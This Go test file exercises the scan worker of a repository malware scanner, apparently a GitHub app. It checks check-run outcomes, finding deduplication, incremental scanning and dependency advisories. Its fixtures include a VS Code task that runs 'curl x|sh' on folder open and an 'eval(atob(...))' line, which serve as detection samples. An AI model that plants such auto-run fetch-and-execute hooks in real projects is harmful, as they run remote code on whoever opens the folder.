package worker_test

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"testing"
	"time"

	"github.com/Ferousco-dev/polinchaser/internal/github"
	"github.com/Ferousco-dev/polinchaser/internal/policy"
	"github.com/Ferousco-dev/polinchaser/internal/queue"
	"github.com/Ferousco-dev/polinchaser/internal/store"
	"github.com/Ferousco-dev/polinchaser/internal/testutil"
	"github.com/Ferousco-dev/polinchaser/internal/webhook"
	"github.com/Ferousco-dev/polinchaser/internal/worker"
	"github.com/Ferousco-dev/polinchaser/pkg/scanner"
)

const sig = "POLINCHASER-TEST-MALWARE-SIGNATURE-DO-NOT-EXECUTE"

type fakeForge struct {
	files      map[string][]byte
	skips      []scanner.Skipped
	changed    []string
	changedOK  bool
	fetchErr   error
	createErr  error
	checkConcl string
	checkOut   github.CheckOutput
	completed  int
	created    int
}

func (f *fakeForge) ResolveHead(context.Context, int64, string, string) (string, error) {
	return "headsha", nil
}
func (f *fakeForge) ChangedFiles(context.Context, int64, string, string, string) ([]string, bool, error) {
	return f.changed, f.changedOK, nil
}
func (f *fakeForge) FetchSnapshot(context.Context, int64, string, string, github.ArchiveLimits) (scanner.PreparedSource, error) {
	if f.fetchErr != nil {
		return scanner.PreparedSource{}, f.fetchErr
	}
	cp := map[string][]byte{}
	for k, v := range f.files {
		cp[k] = v
	}
	return scanner.PreparedSource{Files: cp, Skips: f.skips}, nil
}
func (f *fakeForge) CreateCheckRun(context.Context, int64, string, string) (int64, error) {
	f.created++
	return 55, f.createErr
}
func (f *fakeForge) CompleteCheckRun(_ context.Context, _ int64, _ string, _ int64, c string, o github.CheckOutput) error {
	f.completed++
	f.checkConcl, f.checkOut = c, o
	return nil
}

type env struct {
	t         *testing.T
	st        *store.Store
	forge     *fakeForge
	sc        *worker.Scanner
	inst, rep int64
}

func newEnv(t *testing.T) *env {
	pool := testutil.Pool(t)
	st := &store.Store{Pool: pool}
	ctx := context.Background()
	inst, err := st.UpsertInstallation(ctx, store.Installation{GitHubID: 100, AccountID: 1, Login: "acme", Type: "Organization", Selection: "all"})
	if err != nil {
		t.Fatal(err)
	}
	repo, err := st.UpsertRepo(ctx, inst, store.RepoInput{GitHubID: 9, FullName: "acme/app", DefaultBranch: "main"})
	if err != nil {
		t.Fatal(err)
	}
	f := &fakeForge{files: map[string][]byte{"main.go": []byte("package main")}, changedOK: false}
	rules := scanner.BuiltinRules()
	return &env{t: t, st: st, forge: f, inst: inst, rep: repo.ID, sc: &worker.Scanner{
		Store: st, Forge: f, Engine: scanner.New(rules), RuleVersion: rules.Version, Policy: policy.Default(),
		Timeout: time.Minute, Archive: github.DefaultArchiveLimits, Log: slog.New(slog.NewTextHandler(io.Discard, nil))}}
}

func (e *env) job(trigger string, attempt, max int, mod func(*webhook.ScanJob)) *queue.Job {
	sj := webhook.ScanJob{InstallationID: e.inst, RepositoryID: e.rep, Trigger: trigger, CommitSHA: "abc123"}
	if mod != nil {
		mod(&sj)
	}
	b, _ := json.Marshal(sj)
	return &queue.Job{ID: 1, Kind: "scan", Payload: b, Attempts: attempt, MaxAttempts: max}
}

func (e *env) count(sql string, args ...any) (n int) {
	if err := e.st.Pool.QueryRow(context.Background(), sql, args...).Scan(&n); err != nil {
		e.t.Fatal(err)
	}
	return
}

func TestCleanScanSucceeds(t *testing.T) {
	e := newEnv(t)
	if err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil)); err != nil {
		t.Fatal(err)
	}
	if e.forge.checkConcl != "success" || e.count(`SELECT count(*) FROM scans WHERE status='clean'`) != 1 {
		t.Fatalf("concl=%s", e.forge.checkConcl)
	}
	if e.count(`SELECT count(*) FROM findings`) != 0 {
		t.Fatal("unexpected findings")
	}
}

func TestMalwareFailsCheckAndPersistsFinding(t *testing.T) {
	e := newEnv(t)
	e.forge.files["postcss.config.mjs"] = []byte("export default {}\n// " + sig + "\n")
	if err := e.sc.Handle(context.Background(), e.job("pull_request", 1, 5, func(j *webhook.ScanJob) { j.PRNumber = 3 })); err != nil {
		t.Fatal(err)
	}
	if e.forge.checkConcl != "failure" || len(e.forge.checkOut.Annotations) != 1 {
		t.Fatalf("%s %+v", e.forge.checkConcl, e.forge.checkOut)
	}
	if e.forge.checkOut.Annotations[0].StartLine != 2 || e.forge.checkOut.Annotations[0].Level != "failure" {
		t.Fatalf("annotation %+v", e.forge.checkOut.Annotations[0])
	}
	if e.count(`SELECT count(*) FROM findings WHERE severity='critical' AND confidence='confirmed_signature' AND installation_id=$1`, e.inst) != 1 {
		t.Fatal("finding not stored")
	}
	if e.count(`SELECT count(*) FROM scans WHERE status='findings_detected' AND pr_number=3`) != 1 {
		t.Fatal("scan row wrong")
	}
}

func TestRescanDeduplicatesFindingAndReopensResolved(t *testing.T) {
	e := newEnv(t)
	e.forge.files["a.js"] = []byte(sig)
	ctx := context.Background()
	e.sc.Handle(ctx, e.job("push", 1, 5, nil))
	e.st.Pool.Exec(ctx, `UPDATE findings SET status='resolved'`)
	e.sc.Handle(ctx, e.job("push", 1, 5, func(j *webhook.ScanJob) { j.CommitSHA = "def456" }))
	if e.count(`SELECT count(*) FROM findings`) != 1 || e.count(`SELECT count(*) FROM finding_occurrences`) != 2 {
		t.Fatal("not deduplicated")
	}
	if e.count(`SELECT count(*) FROM findings WHERE status='open'`) != 1 {
		t.Fatal("resolved finding not reopened")
	}
	e.st.Pool.Exec(ctx, `UPDATE findings SET status='false_positive'`)
	e.sc.Handle(ctx, e.job("push", 1, 5, func(j *webhook.ScanJob) { j.CommitSHA = "999" }))
	if e.count(`SELECT count(*) FROM findings WHERE status='false_positive'`) != 1 {
		t.Fatal("false_positive must not be silently reopened")
	}
}

func TestIncrementalScansChangedAndContextFilesOnly(t *testing.T) {
	e := newEnv(t)
	e.forge.files["old.js"] = []byte(sig)                   // unchanged: out of scope for incremental
	e.forge.files["changed.js"] = []byte("eval(atob('x'))") // changed
	e.forge.files[".vscode/tasks.json"] = []byte(`{"runOn":"folderOpen","command":"curl x|sh"}`)
	e.forge.changed, e.forge.changedOK = []string{"changed.js"}, true
	err := e.sc.Handle(context.Background(), e.job("push", 1, 5, func(j *webhook.ScanJob) { j.BaseSHA = "base1" }))
	if err != nil {
		t.Fatal(err)
	}
	if e.count(`SELECT count(*) FROM findings WHERE path='old.js'`) != 0 {
		t.Fatal("unchanged file scanned in incremental mode")
	}
	if e.count(`SELECT count(*) FROM findings WHERE path='changed.js'`) != 1 || e.count(`SELECT count(*) FROM findings WHERE path='.vscode/tasks.json'`) != 1 {
		t.Fatal("changed/context files not scanned")
	}
	// Install scans (no base) always scan everything.
	e2 := newEnv(t)
	e2.forge.files["old.js"] = []byte(sig)
	e2.sc.Handle(context.Background(), e2.job("install", 1, 5, nil))
	if e2.count(`SELECT count(*) FROM findings WHERE path='old.js'`) != 1 {
		t.Fatal("full scan missed file")
	}
}

func TestSkippedFilesMeanIncompleteNeverClean(t *testing.T) {
	e := newEnv(t)
	e.forge.skips = []scanner.Skipped{{Path: "link", Reason: scanner.SkipSymlink}}
	if err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil)); err != nil {
		t.Fatal(err)
	}
	if e.forge.checkConcl == "success" || e.count(`SELECT count(*) FROM scans WHERE status='incomplete'`) != 1 {
		t.Fatalf("incomplete scan reported as %s", e.forge.checkConcl)
	}
}

func TestTransientFetchFailureRetriesWithoutClaimingClean(t *testing.T) {
	e := newEnv(t)
	e.forge.fetchErr = &github.APIError{Status: 502}
	err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil))
	var p interface{ Unwrap() error }
	if err == nil || errors.As(err, &p) {
		t.Fatalf("want retryable error, got %v", err)
	}
	if e.forge.completed != 0 {
		t.Fatal("check completed before final attempt")
	}
	if e.count(`SELECT count(*) FROM scans WHERE status='failed'`) != 1 {
		t.Fatal("failed scan not recorded")
	}
}

func TestFinalFetchFailureMarksCheckNotVerified(t *testing.T) {
	e := newEnv(t)
	e.forge.fetchErr = &github.APIError{Status: 502}
	err := e.sc.Handle(context.Background(), e.job("push", 5, 5, nil))
	if err == nil || e.forge.checkConcl != "failure" || e.forge.completed != 1 {
		t.Fatalf("err=%v concl=%q", err, e.forge.checkConcl)
	}
	if !contains(e.forge.checkOut.Title, "NOT verified") {
		t.Fatalf("title: %s", e.forge.checkOut.Title)
	}
}

func TestOversizedArchiveIsPermanentAndFailsCheck(t *testing.T) {
	e := newEnv(t)
	e.forge.fetchErr = github.ErrArchiveTooLarge
	err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil))
	if err == nil || e.forge.checkConcl != "failure" {
		t.Fatalf("err=%v concl=%q", err, e.forge.checkConcl)
	}
}

func TestCheckRunCreationFailureDoesNotBlockScan(t *testing.T) {
	e := newEnv(t)
	e.forge.createErr = &github.APIError{Status: 403}
	e.forge.files["a.js"] = []byte(sig)
	if err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil)); err != nil {
		t.Fatal(err)
	}
	if e.count(`SELECT count(*) FROM findings`) != 1 {
		t.Fatal("scan skipped because check could not be created")
	}
}

func TestTamperedJobsAreRejectedAsPermanent(t *testing.T) {
	e := newEnv(t)
	ctx := context.Background()
	other, _ := e.st.UpsertInstallation(ctx, store.Installation{GitHubID: 200, AccountID: 2, Login: "evil", Type: "User", Selection: "all"})
	// Job claims installation "other" but references acme's repository.
	err := e.sc.Handle(ctx, e.job("push", 1, 5, func(j *webhook.ScanJob) { j.InstallationID = other }))
	if err == nil || e.forge.created != 0 {
		t.Fatalf("cross-installation job processed: %v", err)
	}
	if err := e.sc.Handle(ctx, &queue.Job{Payload: []byte("{bad"), MaxAttempts: 5}); err == nil {
		t.Fatal("bad payload accepted")
	}
	e.st.RemoveInstallation(ctx, 100)
	if err := e.sc.Handle(ctx, e.job("push", 1, 5, nil)); err == nil || e.forge.created != 0 {
		t.Fatal("removed installation scanned")
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

func TestFindingsEnqueueOneAlertJobAndCleanScansDoNot(t *testing.T) {
	e := newEnv(t)
	e.sc.Notify = queue.New(e.st.Pool)
	ctx := context.Background()
	if err := e.sc.Handle(ctx, e.job("push", 1, 5, nil)); err != nil {
		t.Fatal(err)
	}
	if e.count(`SELECT count(*) FROM jobs WHERE kind='notify'`) != 0 {
		t.Fatal("clean scan queued an alert")
	}
	e.forge.files["a.js"] = []byte(sig)
	e.sc.Handle(ctx, e.job("push", 1, 5, func(j *webhook.ScanJob) { j.CommitSHA = "bad1" }))
	if e.count(`SELECT count(*) FROM jobs WHERE kind='notify'`) != 1 {
		t.Fatal("alert job not queued")
	}
}

type fakeDeps struct {
	findings []scanner.Finding
	err      error
	got      []scanner.Dependency
}

func (f *fakeDeps) Check(_ context.Context, d []scanner.Dependency) ([]scanner.Finding, error) {
	f.got = d
	return f.findings, f.err
}

const lockfile = `{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.0"}}}`

func vulnFinding(t *testing.T, sev string) scanner.Finding {
	f, ok := scanner.AdvisoryFinding(scanner.Dependency{Ecosystem: "npm", Name: "lodash", Version: "4.17.0", Path: "package-lock.json"},
		scanner.Advisory{ID: "GHSA-aaaa-bbbb-cccc", Severity: sev, Summary: "Prototype pollution"})
	if !ok {
		t.Fatal("advisory finding rejected")
	}
	return f
}

func TestDependencyAdvisoryWarnsButNeverBlocksOrEmails(t *testing.T) {
	e := newEnv(t)
	e.forge.files["package-lock.json"] = []byte(lockfile)
	d := &fakeDeps{findings: []scanner.Finding{vulnFinding(t, "critical")}}
	e.sc.Deps = d
	if err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil)); err != nil {
		t.Fatal(err)
	}
	if len(d.got) != 1 || d.got[0].Name != "lodash" {
		t.Fatalf("dependencies sent for lookup: %+v", d.got)
	}
	if e.forge.checkConcl == "failure" {
		t.Error("a dependency CVE must not fail the check by itself")
	}
	if e.count(`SELECT count(*) FROM findings WHERE category='vulnerable_dependency' AND severity='critical'`) != 1 {
		t.Error("advisory finding not stored with its real severity")
	}
	if e.count(`SELECT count(*) FROM scans WHERE status='findings_detected'`) != 1 {
		t.Error("scan should report findings")
	}
	got, err := e.st.UnnotifiedFindings(context.Background(), 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range got {
		if f.Category == "vulnerable_dependency" {
			t.Error("routine dependency advisory was selected for an alert email")
		}
	}
}

func TestDependencyLookupFailureMakesScanIncompleteNotClean(t *testing.T) {
	e := newEnv(t)
	e.forge.files["package-lock.json"] = []byte(lockfile)
	e.sc.Deps = &fakeDeps{err: context.DeadlineExceeded}
	if err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil)); err != nil {
		t.Fatal(err)
	}
	if e.forge.checkConcl == "success" || e.count(`SELECT count(*) FROM scans WHERE status='incomplete'`) != 1 {
		t.Fatalf("failed OSV lookup reported as %s", e.forge.checkConcl)
	}
}

func TestNoLockfileMeansNoLookup(t *testing.T) {
	e := newEnv(t)
	d := &fakeDeps{err: context.DeadlineExceeded}
	e.sc.Deps = d
	if err := e.sc.Handle(context.Background(), e.job("push", 1, 5, nil)); err != nil {
		t.Fatal(err)
	}
	if d.got != nil || e.count(`SELECT count(*) FROM scans WHERE status='clean'`) != 1 {
		t.Error("lookup should not run, and the scan should stay clean, when there are no dependencies")
	}
}
